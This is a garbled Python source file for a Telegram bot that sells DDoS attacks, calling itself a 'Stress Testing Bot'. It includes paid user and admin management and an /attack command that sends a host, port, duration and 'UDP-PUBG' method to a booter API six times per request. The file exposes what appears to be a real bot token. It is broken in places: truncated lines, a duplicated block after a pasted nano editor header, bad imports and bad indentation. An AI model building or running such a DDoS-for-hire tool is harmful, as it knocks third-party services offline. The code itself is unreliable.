import telebot
import requestsea
import datetime
import time
import os                                                               import logging

# Configure logging
logging.basicConfig(filename='bot.log', level=me)s - %(message)s')      
# Example usage in your script                                          logging.debug('Debug message')
logging.info('Informational message')
logging.warning('Warning message')
logging.error('Error message')

# Insert your Telegram bot token here
bot = telebot.TeleBot('7495561390:AAGvqMRmv7cIT3Jaqc-cd0E06Hy-CfR7Qzc')
                                                                        # Owner and admin user IDs
owner_id = "6330082725"
admin_id = ["YOUR_ADMIN_ID1", "YOUR_ADMIN_ID2"]

# File to store allowed user IDs
USER_FILE = "users.txt"

# File to store command logs
LOG_FILE = "log.txt"

# File to store free user IDs and their credits
FREE_USER_FILE = "free_users.txt"

# Dictionary to store free user credits
free_user_credits = {}

FREE_USER_FILE = "free_users.txt"

# Dictionary to store free user credits
free_user_credits = {}

# Dictionary to store cooldown time for each user's last attack
attack_cooldown = {}

# Key prices for different durations
key_prices = {
    "day": 0,                                                               "week": 0,
    "month": 0
}
                                                                        # Function to xread user IDs from the file
def read_users():                                                           try:
        with open(USER_FILE, "r") as file:
            return [line.split()[0] for line in file.readlines()]
    except FileNotFoundError:
        return []

# Function to read free user IDs and their credits from the file
def read_free_users():                                                      try:
        with open(FREE_USER_FILE, "r") as file:
            lines = file.read().splitlines()
            for line in lines:
                if line.strip():  # Check if line is not empty
                    user_info = line.split()
                    if len(user_info) == 2:
                    user_id, credits = user_info                                            free_user_credits[user_id] = int(credits)
                    else:
                        print(f"Ignoring invalid line in free user file>
    except FileNotFoundError:

# Read allowed user IDs and free user IDs
allowed_user_ids = read_users()
read_free_users()

# Function to log command to the file
def log_command(user_id, target, port, duration):
    user_info = bot.get_chat(user_id)
    username = "@" + user_info.username if user_info.username else f


# Function to record command logs
def record_command_logs(user_id, command, target=None, port=None, durat>
    log_entry = f"UserID: {user_id} | Time: {datetime.datetime.now()} |>
    if target:
        log_entry += f" | Target: {target}"
    if port:
        log_entry += f" | Port: {port}"
    if duration:                                                                log_entry += f" | Time: {duration}"

    with open(LOG_FILE, "a") as file:
        file.write(log_entry + "\n")

# Function to get current time                                          def get_current_time():
    return datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

@bot.message_handler(commands=['start'])
def send_welcome(message):
    response = (
        f"🌟 Welcome to the KRISHNA Stress Testing Bot! 🌟\n\n"
        f"Current Time: {get_current_time()}\n\n"
        "Here are some commands you can use:\n"
 "Here are some commands you can use:\n"

 "👤 /approveuser <id> <duration> - Approve a user for a certain>
        "❌ /removeuser <id> - Remove a user\n"
        "🔑 /addadmin <id> <balance> - Add an admin with a starting bal>
        "🚫 /removeadmin <id> - Remove an admin\n"
        "💰 /checkbalance - Check your balance\n"
        "💥 /attack <host> <port> <time> - Simulate a DDoS attack\n"
        "💸 /setkeyprice <day/week/month> <price> - Set key price for d>
        "Please use these commands responsibly. 😊"

target = command[1]
    port = command[2]
    duration = int(command[3])
    method = "UDP-PUBG"  # Default method

    api_url = ""
    api_key = ""

    payload = {
        "key": api_key,
        "host": target,
        "port": port,
        "time": duration,
        "method": method
    }

    success_count = 0
    for _ in range(6):

  GNU nano 6.2                                              ok.py
        bot.reply_to(message, response)
        return

    target = command[1]
    port = command[2]
    duration = int(command[3])
    method = "UDP-PUBG"  # Default method

    api_url = ""
    api_key = ""

    payload = {
        "key": api_key,
        "host": target,
        "port": port,                                                                                                           "time": duration,
        "method": method
    }

    success_count = 0
    for _ in range(6):
        response = requests.get(api_url, params=payload)
        if response.status_code == 200:
            success_count += 1
            # Log the command
            log_command(user_id, target, port, duration)
        time.sleep(1)  # Adding a small delay between requests

    if success_count > 0:
        attack_cooldown[user_id] = time.time()  # Update the last attack time
        # Send response
        start_attack_reply(message.chat.id, target, port, duration, response.text, success_count)
        # Schedule cooldown removal message
        time.sleep(60)  # Wait for cooldown period
        cooldown_removal(user_id)  # Send cooldown removal message
    else:
        bot.reply_to(message, "Failed to start the attack. Please try again later.")

@bot.message_handler(func=lambda message: True)
def handle_unknown_command(message):
    response = (
        f"🌟 Welcome to the fire karan ddos Bot! 🌟\n\n"
        f"Current Time: {get_current_time()}\n\n"
        "Here are some commands you can use:\n"
        "👤 /approveuser <id> <duration> - Approve a user for a certain duration (day, week, month)\n"
        "❌ /removeuser <id> - Remove a user\n"
        "🔑 /addadmin <id> <balance> - Add an admin with a starting balance\n"
        "🚫 /removeadmin <id> - Remove an admin\n"
        "💰 /checkbalance - Check your balance\n"
        "💥 /attack <host> <port> <time> - Simulate a DDoS attack\n"
        "💸 /setkeyprice <day/week/month> <price> - Set key price for different durations (Owner only)\n\n"
        "Please use these commands responsibly. 😊"
    )
    bot.reply_to(message, response)


#Start the bot
bot.polling()